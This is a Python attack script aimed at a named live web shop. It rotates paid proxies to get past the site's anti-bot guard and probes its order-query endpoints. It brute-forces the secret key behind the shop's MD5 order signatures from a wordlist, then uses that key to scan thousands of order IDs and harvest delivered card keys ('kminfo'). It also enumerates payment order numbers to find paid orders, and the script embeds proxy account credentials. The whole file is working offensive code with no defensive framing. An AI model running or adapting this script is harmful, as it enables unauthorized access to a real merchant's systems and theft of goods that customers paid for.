#!/usr/bin/env python3
"""v6 local runner - fetch qg proxy inline, focus SYS_KEY + ajax query"""
import re, json, subprocess, time, os, hashlib, urllib.request

OUT = "/tmp/hmjf_v6"
os.makedirs(OUT, exist_ok=True)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = "https://hmjf.lol/shop/"
BASE = "https://hmjf.lol/shop"
QG_KEY, QG_PWD = "02E76F93", "A0FFB679553D"
N = 0
R = {"hits": [], "sys_key": None, "tests": {}}

def fetch_proxy():
    url = f"https://share.proxy.qg.net/get?key={QG_KEY}&pwd={QG_PWD}&num=1&distinct=true"
    d = json.loads(urllib.request.urlopen(url, timeout=15).read())
    srv = d["data"][0]["server"]
    return f"http://{QG_KEY}:{QG_PWD}@{srv}"

PX = fetch_proxy()

def refresh():
    global PX
    time.sleep(2)
    PX = fetch_proxy()
    print(f"  proxy -> {PX.split('@')[-1]}", flush=True)

def go(url, post=None, timeout=18):
    global N, PX
    N += 1
    if N % 50 == 0:
        refresh()
    c = ["curl", "-s", "-w", "\n__C:%{http_code}__", "--max-time", str(timeout),
         "-A", UA, "-H", f"Referer: {REF}", "-x", PX]
    if post is not None:
        c += ["-X", "POST", "-d", post,
              "-H", "Content-Type: application/x-www-form-urlencoded"]
    c.append(url)
    try:
        raw = subprocess.run(c, capture_output=True, text=True, timeout=timeout + 5).stdout or ""
        if "_guard" in raw or "slider_html" in raw:
            time.sleep(6)
            refresh()
            return go(url, post, timeout)
        m = re.search(r"__C:(\d+)__", raw)
        body = raw[:m.start()] if m else raw
        return body, int(m.group(1)) if m else 0
    except Exception as e:
        return str(e), 0

def hit(tag, data):
    R["hits"].append({"via": tag, "data": data})
    print(f"*** HIT [{tag}] {str(data)[:350]}", flush=True)

def skey_for(oid, sys_key):
    return hashlib.md5(f"{oid}{sys_key}{oid}".encode()).hexdigest()

def save():
    json.dump(R, open(f"{OUT}/results.json", "w"), ensure_ascii=False, indent=2)

# connectivity
body, code = go(f"{BASE}/ajax.php?act=getcount", "")
print(f"[0] getcount code={code} body={body[:120]}", flush=True)
if code == 0 and not body.strip():
    print("proxy fail, exit", flush=True)
    raise SystemExit(1)

# A ajax query
print("[A] ajax query POST", flush=True)
tns = ["20260716025337303", "20260716030008400", "20260716031217345", "20260716031222624"]
for tn in tns:
    for post in [f"type=1&qq={tn}", f"qq={tn}", f"type=1&data={tn}"]:
        body, code = go(f"{BASE}/ajax.php?act=query", post)
        key = f"q_{tn[-6:]}_{post[:15]}"
        R["tests"][key] = {"code": code, "body": body[:250]}
        if body and '"code":0' in body and '"data"' in body:
            hit("ajax_query", {"tn": tn, "post": post, "body": body[:500]})
            try:
                for row in json.loads(body).get("data", []):
                    oid, sk = row.get("id"), row.get("skey")
                    if oid and sk:
                        h, _ = go(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}")
                        try:
                            oj = json.loads(h)
                            if oj.get("kminfo"):
                                hit("kminfo", {"id": oid, "kminfo": oj["kminfo"][:200]})
                        except Exception:
                            pass
            except Exception:
                pass
        time.sleep(0.3)
save()

# B SYS_KEY brute
print("[B] SYS_KEY brute", flush=True)
KEYS = [
    "", "123456", "123456789", "12345678", "xuxin", "hmjf", "hmjf.lol", "shua", "faka",
    "admin", "secret", "key", "password", "虚心", "虚心U", "kakayun", "caihong",
    "666666", "888888", "datou111", "1003", "ttwl66", "api.ttwl66.cn",
    "xuxinU", "虚心U自动发卡", "hmjf2026", "rainbow", "cccyun", "yunshang",
    "02E76F93", "A0FFB679553D", "efd3476d7713d12e0c8011c909a2a274b00c5cfa99bc8e79193c08078beeb8df",
]
for sk in KEYS:
    found = False
    for oid in range(1, 301):
        calc = skey_for(oid, sk)
        h, _ = go(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={calc}", timeout=12)
        if not h or "验证失败" in h:
            continue
        try:
            j = json.loads(h)
            if j.get("code") == 0:
                hit("SYS_KEY", {"sys_key": sk, "id": oid, "name": j.get("name"), "status": j.get("status")})
                R["sys_key"] = sk
                if j.get("kminfo"):
                    hit("kminfo_syskey", {"id": oid, "kminfo": j["kminfo"][:200]})
                found = True
                break
        except Exception:
            if "kminfo" in h.lower():
                hit("SYS_KEY_raw", {"sys_key": sk, "id": oid, "raw": h[:200]})
                R["sys_key"] = sk
                found = True
                break
    if found:
        break
    print(f"  tried KEY={sk!r}", flush=True)
    time.sleep(0.1)
save()

# C if SYS_KEY found batch scan
if R["sys_key"]:
    print(f"[C] batch id scan SYS_KEY={R['sys_key']!r}", flush=True)
    for oid in range(1, 5001):
        sk = skey_for(oid, R["sys_key"])
        h, _ = go(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}", timeout=10)
        try:
            j = json.loads(h)
            if j.get("kminfo"):
                hit("batch_kami", {"id": oid, "name": j.get("name"), "kminfo": j["kminfo"][:300]})
        except Exception:
            pass
        if oid % 200 == 0:
            print(f"  id {oid} hits={len(R['hits'])}", flush=True)
            save()
        time.sleep(0.1)

# D quick paid hunt - sample prefixes
print("[D] paid sample scan", flush=True)
prefixes = ["20260716025337", "20260715120000", "20260714180000", "20260115120000", "20251115120000"]
for prefix in prefixes:
    for s in [0, 100, 200, 300, 400, 500, 303, 373, 400]:
        tn = f"{prefix[:14]}{s:03d}" if len(prefix) >= 14 else f"{prefix}{s:03d}"
        if len(tn) != 17:
            continue
        sh, _ = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
        if "window.location" not in sh or "该订单号不存在" in sh:
            continue
        gs, _ = go(f"{BASE}/other/getshop.php?trade_no={tn}")
        qb, _ = go(f"{BASE}/ajax.php?act=query", f"type=1&qq={tn}")
        ent = {"trade_no": tn, "getshop": gs[:120], "query": qb[:200]}
        R["tests"][f"paid_{tn}"] = ent
        try:
            gj = json.loads(gs)
            if gj.get("kminfo") or (gj.get("code") != -1 and gj.get("msg") != "未付款"):
                hit("paid_candidate", ent)
        except Exception:
            pass
        if qb and '"data"' in qb and len(qb) > 50:
            hit("paid_query", ent)
        time.sleep(0.25)
save()

print(f"DONE hits={len(R['hits'])} sys_key={R['sys_key']}", flush=True)
json.dump(R, open(f"{OUT}/results.json", "w"), ensure_ascii=False, indent=2)
